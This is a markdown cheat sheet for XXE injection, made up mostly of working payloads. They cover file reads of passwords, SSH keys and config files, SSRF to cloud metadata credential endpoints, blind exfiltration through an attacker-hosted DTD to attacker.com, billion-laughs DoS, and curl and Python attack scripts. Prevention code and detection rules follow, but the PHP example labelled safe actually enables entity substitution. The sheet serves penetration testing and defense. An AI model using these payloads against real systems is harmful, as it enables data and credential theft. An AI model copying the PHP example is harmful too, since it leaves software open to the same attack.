# XXE Injection - Complete Cheat Sheet

## Quick Reference Table

| Attack Type | Use When | Payload Prefix | Time | Detection |
|-------------|----------|----------------|------|-----------|
| Basic XXE | Output visible | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///...">]>` | 2 min | Direct |
| SSRF | Output visible | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://...">]>` | 3 min | Direct |
| Blind OOB | No output, egress allowed | `<!ENTITY % xxe SYSTEM "http://COLLAB"> %xxe;` | 2 min | Collaborator |
| Error-based | No output, errors shown | External DTD with invalid path | 5 min | Error msg |
| XInclude | Can't control DOCTYPE | `<xi:include xmlns:xi="..." href="..."/>` | 2 min | Direct |
| SVG | File upload | SVG file with DOCTYPE | 3 min | Direct |
| Local DTD | Everything blocked | Repurpose system DTD | 10 min | Error msg |

---

## Complete Payload Reference

### 1. Basic File Retrieval

**Template:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///PATH/TO/FILE"> ]>
<root>
  <element>&xxe;</element>
</root>
```

**Common Linux targets:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/group"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/self/environ"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/self/cmdline"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/version"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/log/apache2/access.log"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/www/html/config.php"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///root/.bash_history"> ]>
```

**Common Windows targets:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/boot.ini"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/system32/config/sam"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/users/administrator/desktop/desktop.ini"> ]>
```

**Application files:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/www/html/config.php"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/www/html/.env"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/nginx/nginx.conf"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/apache2/apache2.conf"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///app/config/database.yml"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/tomcat/conf/tomcat-users.xml"> ]>
```

### 2. SSRF Attacks

**AWS EC2 Metadata:**
```xml
<!-- Base -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>

<!-- Latest API -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/"> ]>

<!-- Meta-data -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>

<!-- IAM credentials path -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/"> ]>

<!-- Security credentials -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>

<!-- Full credential path (replace ROLE with actual role name) -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE"> ]>

<!-- User data -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/user-data"> ]>

<!-- Instance identity -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/dynamic/instance-identity/document"> ]>
```

**Azure Metadata:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/"> ]>
```

**GCP Metadata:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/project/project-id"> ]>
```

**Internal services:**
```xml
<!-- Localhost services -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:80/"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:8080/admin"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:3000/api"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:5000/"> ]>

<!-- Common internal IPs -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://192.168.1.1/"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://172.16.0.1/"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://10.0.0.1/"> ]>

<!-- Internal hostnames -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal-api.local/"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://admin.internal/"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://database.local:3306/"> ]>
```

**Port scanning:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://target:22"> ]>   <!-- SSH -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://target:3306"> ]> <!-- MySQL -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://target:5432"> ]> <!-- PostgreSQL -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://target:6379"> ]> <!-- Redis -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://target:27017"> ]> <!-- MongoDB -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://target:9200"> ]> <!-- Elasticsearch -->
```

### 3. Blind XXE - Out-of-Band

**Basic OOB detection:**
```xml
<!-- HTTP -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com"> ]>
<root>&xxe;</root>

<!-- HTTPS -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://attacker.com"> ]>
<root>&xxe;</root>

<!-- FTP -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "ftp://attacker.com"> ]>
<root>&xxe;</root>
```

**Parameter entity OOB:**
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe; ]>
<root>test</root>
```

**Data exfiltration (requires external DTD hosting):**

**Main payload:**
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<root>test</root>
```

**evil.dtd (host on attacker server):**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

**With base64 encoding (PHP):**
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

**FTP exfiltration:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com:2121/?%file;'>">
%eval;
%exfil;
```

### 4. Error-Based XXE

**Main payload:**
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/error.dtd"> %xxe;]>
<root>test</root>
```

**error.dtd (host on attacker server):**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

**Alternative error triggers:**
```xml
<!-- Invalid file path -->
<!ENTITY % error SYSTEM 'file:///invalid/%file;'>

<!-- Invalid protocol -->
<!ENTITY % error SYSTEM 'invalid-protocol://%file;'>

<!-- Invalid port -->
<!ENTITY % error SYSTEM 'http://localhost:99999/%file;'>
```

### 5. XInclude Attacks

**Basic XInclude:**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

**Minimal payload:**
```xml
<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>
```

**With fallback:**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd">
    <xi:fallback>File not found</xi:fallback>
  </xi:include>
</foo>
```

**Multiple includes:**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
  <xi:include parse="text" href="file:///etc/hostname"/>
</foo>
```

**SSRF with XInclude:**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="http://169.254.169.254/latest/meta-data/"/>
</foo>
```

### 6. SVG-Based XXE

**Basic SVG XXE:**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

**Formatted SVG:**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg">
  <rect width="500" height="500" fill="white"/>
  <text x="10" y="20" font-family="monospace" font-size="10" fill="black">&xxe;</text>
</svg>
```

**Blind SVG XXE:**
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "http://attacker.com/log"> ]>
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="&xxe;"/>
</svg>
```

**Multiple text elements:**
```xml
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="1000">
  <text x="0" y="20" font-size="12">&xxe;</text>
</svg>
```

### 7. Local DTD Repurposing

**Linux (GNOME systems):**
```xml
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<root>test</root>
```

**Alternative Linux DTDs:**
```xml
<!-- Font config -->
<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
<!ENTITY % constants '...payload...'>

<!-- DocBook -->
<!ENTITY % local_dtd SYSTEM "file:///usr/share/sgml/docbook/dtd/4.1/docbook.dtd">

<!-- XML Catalog -->
<!ENTITY % local_dtd SYSTEM "file:///etc/xml/catalog">
```

**Windows systems:**
```xml
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///c:/windows/system32/wbem/xml/cim20.dtd">
  <!ENTITY % SuperClass '
    <!ENTITY &#x25; file SYSTEM "file:///c:/windows/win.ini">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

**Entity names to try:**
```
%ISOamso;
%ISOgrk3;
%ISOlat1;
%ISOnum;
%ISOtech;
%constants;
%SuperClass;
```

### 8. PHP Wrappers

**Base64 encoding:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
```

**Read PHP files:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php"> ]>
```

**Expect wrapper (if enabled):**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "expect://id"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "expect://ls"> ]>
```

**Data wrapper:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "data://text/plain,Hello%20World"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "data://text/plain;base64,SGVsbG8gV29ybGQ="> ]>
```

### 9. Advanced Payloads

**UTF-16 encoding (WAF bypass):**
```xml
<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>
```

**Character entity encoding:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://&#x2f;etc&#x2f;passwd"> ]>
```

**CDATA sections:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe "<![CDATA[file:///etc/passwd]]>"> ]>
```

**Multiple entities:**
```xml
<!DOCTYPE foo [
  <!ENTITY xxe1 SYSTEM "file:///etc/passwd">
  <!ENTITY xxe2 SYSTEM "file:///etc/hostname">
  <!ENTITY xxe3 SYSTEM "file:///etc/hosts">
]>
<root>
  <a>&xxe1;</a>
  <b>&xxe2;</b>
  <c>&xxe3;</c>
</root>
```

**Nested entities:**
```xml
<!DOCTYPE foo [
  <!ENTITY inner "inner content">
  <!ENTITY outer "outer &inner; content">
]>
<root>&outer;</root>
```

### 10. Billion Laughs Attack (DoS)

**Classic billion laughs:**
```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>&lol9;</root>
```

**Quadratic blowup:**
```xml
<!DOCTYPE bomb [
  <!ENTITY a "aaaaaaaaaaaaaaaaaaaa..."> <!-- 10,000 a's -->
]>
<root>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</root> <!-- Repeat many times -->
```

---

## Protocol Variations

### File Protocol

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">     <!-- Standard -->
<!ENTITY xxe SYSTEM "file://localhost/etc/passwd">  <!-- With host -->
<!ENTITY xxe SYSTEM "file:/etc/passwd">       <!-- Relative -->
```

### HTTP/HTTPS

```xml
<!ENTITY xxe SYSTEM "http://attacker.com">
<!ENTITY xxe SYSTEM "https://attacker.com">
<!ENTITY xxe SYSTEM "http://attacker.com:8080">
<!ENTITY xxe SYSTEM "http://user:pass@attacker.com">
```

### FTP

```xml
<!ENTITY xxe SYSTEM "ftp://attacker.com">
<!ENTITY xxe SYSTEM "ftp://attacker.com:2121">
<!ENTITY xxe SYSTEM "ftp://user:pass@attacker.com">
```

### Other Protocols

```xml
<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/file.txt">
<!ENTITY xxe SYSTEM "netdoc:/etc/passwd">
<!ENTITY xxe SYSTEM "gopher://attacker.com">
```

---

## Burp Suite Commands

### Setup

**Generate Collaborator payload:**
```
Burp → Burp Collaborator client → Copy to clipboard
```

**Insert Collaborator in Repeater:**
```
Right-click → Insert Collaborator payload
```

### Scanning

**Active scan for XXE:**
```
Right-click request → Do active scan
Dashboard → Issues → Filter: XML External Entity
```

**Scanner configuration:**
```
Scanner → Scan configuration → Issues reported → XML external entity injection
```

### Testing with Repeater

**Send to Repeater:**
```
Right-click request → Send to Repeater (Ctrl+R)
```

**Common modifications:**
```
1. Change Content-Type to application/xml
2. Insert DOCTYPE declaration
3. Add entity reference
4. Send request (Ctrl+Space)
```

### Intruder Fuzzing

**Payload positions:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///§target§"> ]>
```

**Attack types:**
- Sniper: Single payload position
- Battering ram: Same payload in all positions
- Pitchfork: Multiple coordinated payloads

---

## Testing Commands

### curl

**Basic XXE test:**
```bash
curl -X POST https://target.com/api \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

**Blind XXE test:**
```bash
curl -X POST https://target.com/api \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe;]><root>test</root>'
```

**Read response:**
```bash
curl -X POST https://target.com/api \
  -H "Content-Type: application/xml" \
  -d @payload.xml \
  -v
```

### Python

```python
import requests

# Basic XXE
payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>'''

response = requests.post(
    'https://target.com/api',
    headers={'Content-Type': 'application/xml'},
    data=payload
)

print(response.text)

# Blind XXE
blind_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe; ]>
<root>test</root>'''

requests.post(
    'https://target.com/api',
    headers={'Content-Type': 'application/xml'},
    data=blind_payload
)
```

### JavaScript/Node.js

```javascript
const axios = require('axios');

const payload = `<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>`;

axios.post('https://target.com/api', payload, {
  headers: { 'Content-Type': 'application/xml' }
})
.then(response => console.log(response.data))
.catch(error => console.error(error));
```

---

## Defense/Prevention Code

### Java

```java
// Disable DTDs completely
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setExpandEntityReferences(false);

// SAX Parser
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

// XMLReader
XMLReader reader = XMLReaderFactory.createXMLReader();
reader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
reader.setFeature("http://xml.org/sax/features/external-general-entities", false);
reader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

### PHP

```php
// Disable external entity loading
libxml_disable_entity_loader(true);

// Safe DOMDocument usage
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_NONET);

// SimpleXML
$xml = simplexml_load_string($data, 'SimpleXMLElement', LIBXML_NOENT | LIBXML_NONET);
```

### Python

```python
# lxml - Safe configuration
from lxml import etree

parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True,
    load_dtd=False
)
tree = etree.parse(xml_file, parser)

# ElementTree (safe by default)
import xml.etree.ElementTree as ET
tree = ET.parse(xml_file)  # No external entity resolution

# defusedxml (recommended)
import defusedxml.ElementTree as ET
tree = ET.parse(xml_file)
```

### .NET

```csharp
// XmlDocument
XmlDocument doc = new XmlDocument();
doc.XmlResolver = null;
doc.LoadXml(xmlString);

// XmlReader (recommended)
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
using (XmlReader reader = XmlReader.Create(stream, settings)) {
    // Safe parsing
}

// XDocument (LINQ to XML)
XDocument doc = XDocument.Load(stream, LoadOptions.None);
```

### Node.js

```javascript
// libxmljs
const libxmljs = require('libxmljs');
const xml = libxmljs.parseXml(xmlString, {
  noent: false,  // Disable entity substitution
  nonet: true    // Disable network access
});

// xml2js (safe by default)
const xml2js = require('xml2js');
const parser = new xml2js.Parser({
  // No entity expansion
});
```

---

## Detection Patterns

### Log Analysis

**Look for:**
```
DOCTYPE
ENTITY
SYSTEM
file://
http://169.254.169.254
/etc/passwd
php://filter
```

**Regex patterns:**
```regex
<!DOCTYPE\s+\w+\s*\[
<!ENTITY\s+%?\s*\w+\s+SYSTEM
file:///etc/(passwd|hostname|hosts)
169\.254\.169\.254
php://filter/convert\.base64-encode
```

### SIEM Rules

**Splunk:**
```spl
index=web_logs "<!DOCTYPE" OR "<!ENTITY" OR "SYSTEM"
| where match(_raw, "file:///|169\.254\.169\.254")
| stats count by src_ip, uri
```

**Elastic/ELK:**
```
message: "<!DOCTYPE" OR "<!ENTITY"
AND (message: "file:///" OR message: "169.254.169.254")
```

### WAF Rules

**ModSecurity:**
```apache
SecRule REQUEST_BODY "@rx (?i:<!DOCTYPE)" \
    "id:1000,phase:2,deny,status:403,msg:'XXE: DOCTYPE detected'"

SecRule REQUEST_BODY "@rx (?i:<!ENTITY)" \
    "id:1001,phase:2,deny,status:403,msg:'XXE: ENTITY detected'"

SecRule REQUEST_BODY "@rx (?i:SYSTEM.*file://)" \
    "id:1002,phase:2,deny,status:403,msg:'XXE: File protocol detected'"
```

---

## File Extension Variations

**XML-based formats vulnerable to XXE:**

```
.xml    - XML files
.svg    - Scalable Vector Graphics
.docx   - Microsoft Word
.xlsx   - Microsoft Excel
.pptx   - Microsoft PowerPoint
.odt    - OpenDocument Text
.ods    - OpenDocument Spreadsheet
.odp    - OpenDocument Presentation
.xls    - Excel (some versions)
.rss    - RSS feeds
.atom   - Atom feeds
.gpx    - GPS Exchange Format
.kml    - Keyhole Markup Language
.xhtml  - XHTML documents
.soap   - SOAP messages
.wsdl   - Web Services Description
.xslt   - XSLT stylesheets
.opml   - Outline Processor Markup Language
.xaml   - XAML (Windows Presentation Foundation)
```

---

## Content-Type Variations

**Try these Content-Type headers:**
```
Content-Type: application/xml
Content-Type: text/xml
Content-Type: application/x-xml
Content-Type: application/soap+xml
Content-Type: image/svg+xml
Content-Type: application/xhtml+xml
Content-Type: application/rss+xml
Content-Type: application/atom+xml
```

**Convert from other formats:**
```
Content-Type: application/json      → Convert to XML
Content-Type: application/x-www-form-urlencoded  → May be converted to XML server-side
```

---

## Encoding Reference

### URL Encoding

```
<     = %3C
>     = %3E
"     = %22
'     = %27
&     = %26
/     = %2F
:     = %3A
;     = %3B
!     = %21
```

### XML Entity Encoding

```
<     = &lt;
>     = &gt;
"     = &quot;
'     = &apos;
&     = &amp;
```

### Hex Entity Encoding

```
/     = &#x2f;
<     = &#x3c;
>     = &#x3e;
&     = &#x26;
```

### Base64

```bash
# Encode
echo -n "file:///etc/passwd" | base64

# Decode
echo "ZmlsZTovLy9ldGMvcGFzc3dk" | base64 -d
```

---

## Error Messages

**Common error indicators:**

```
XML parsing error
External entity
File not found
Connection refused
Access denied
java.io.FileNotFoundException
javax.xml.stream.XMLStreamException
org.xml.sax.SAXParseException
lxml.etree.XMLSyntaxError
System.Xml.XmlException
```

**Error message exploitation:**
```xml
<!-- Trigger error with file contents -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

---

## Tools & Scripts

### XXE Detection Tools

**XXEinjector:**
```bash
git clone https://github.com/enjoiz/XXEinjector
perl XXEinjector.pl --host=target.com --file=request.txt --path=/etc/passwd
```

**XXExploiter:**
```bash
git clone https://github.com/luisfontes19/xxexploiter
python xxexploiter.py -r request.txt -p /etc/passwd
```

**dtd-finder:**
```bash
git clone https://github.com/GoSecure/dtd-finder
python dtd-finder.py --file request.txt
```

### Burp Extensions

- **Content Type Converter** - Convert JSON to XML
- **XXE Injector** - Automated payload injection
- **Collaborator Everywhere** - Auto-inject OOB payloads
- **Logger++** - Enhanced logging
- **XXE Detector** - Passive detection

### Online Resources

- **PayloadsAllTheThings:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
- **PortSwigger Labs:** https://portswigger.net/web-security/xxe
- **HackTricks:** https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity

---

## CVE Reference

| CVE | Software | Impact | CVSS |
|-----|----------|--------|------|
| CVE-2017-9805 | Apache Struts | RCE via XXE | 8.1 |
| CVE-2020-6287 | SAP NetWeaver | Pre-auth RCE | 10.0 |
| CVE-2018-0798 | Microsoft Office | XXE in document parsing | 7.8 |
| CVE-2013-1812 | Ruby OpenID | Auth bypass via XXE | 7.5 |
| CVE-2016-3714 | ImageMagick | RCE (ImageTragick) | 8.4 |
| CVE-2019-12384 | Jackson XML | XXE in XML parsing | 7.5 |
| CVE-2021-41773 | Apache HTTP Server | Path traversal + XXE | 7.5 |

---

## CWE/CAPEC Mapping

**CWE (Common Weakness Enumeration):**
- CWE-611: Improper Restriction of XML External Entity Reference
- CWE-776: Improper Restriction of Recursive Entity References (Billion Laughs)
- CWE-827: Improper Control of Document Type Definition

**CAPEC (Common Attack Pattern Enumeration):**
- CAPEC-221: Data Serialization External Entities Blowup
- CAPEC-228: DTD Injection
- CAPEC-250: XML Injection

**MITRE ATT&CK:**
- T1190: Exploit Public-Facing Application

---

## CVSS Scoring Quick Reference

### Base Score Calculation

**File Read XXE:**
- AV:N (Network) / AC:L (Low) / PR:N (None) / UI:N (None)
- C:H (High) / I:N / A:N
- **Score: 7.5 (High)**

**SSRF to Cloud Metadata:**
- AV:N / AC:L / PR:N / UI:N
- C:H / I:H / A:N
- **Score: 9.1 (Critical)**

**RCE via XXE (rare):**
- AV:N / AC:L / PR:N / UI:N
- C:H / I:H / A:H
- **Score: 9.8 (Critical)**

---

## Reporting Template

```markdown
# XML External Entity (XXE) Injection

## Summary
A critical XXE vulnerability was identified in the XML parsing functionality.

## Vulnerability Details
- **Endpoint:** POST /api/endpoint
- **Parameter:** productId (XML body)
- **Severity:** High/Critical
- **CWE:** CWE-611

## Proof of Concept

### Request:
```http
POST /api/endpoint HTTP/1.1
Host: target.com
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>
```

### Response:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

## Impact
- Arbitrary file read from server filesystem
- Server-Side Request Forgery (SSRF) to internal services
- Potential access to cloud metadata endpoints
- Risk of sensitive data exposure (credentials, configuration files)
- Denial of Service via entity expansion attacks

## Remediation

### Immediate Actions:
1. Disable external entity processing:
   ```java
   dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
   ```

2. Disable DTD processing entirely

3. Use safe XML parsers with secure defaults

### Long-term Fixes:
- Implement input validation
- Use JSON instead of XML where possible
- Apply principle of least privilege
- Implement network segmentation
- Monitor for XXE attack patterns

## References
- OWASP XXE Prevention: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- CWE-611: https://cwe.mitre.org/data/definitions/611.html
- PortSwigger XXE: https://portswigger.net/web-security/xxe
```

---

## Quick Decision Tree

```
Start → Is XML being parsed?
         ↓ YES
         Can you see output?
         ├─ YES → Try basic XXE (file read / SSRF)
         └─ NO  → Try blind XXE
                  ↓
                  Outbound connections allowed?
                  ├─ YES → Out-of-band (Collaborator)
                  └─ NO  → Error-based XXE
                           ↓
                           External DTD allowed?
                           ├─ YES → External error DTD
                           └─ NO  → Local DTD repurposing
```

---

**Cheat Sheet Version:** 1.0
**Last Updated:** 2026-01-09
**Purpose:** Complete reference for XXE testing and exploitation
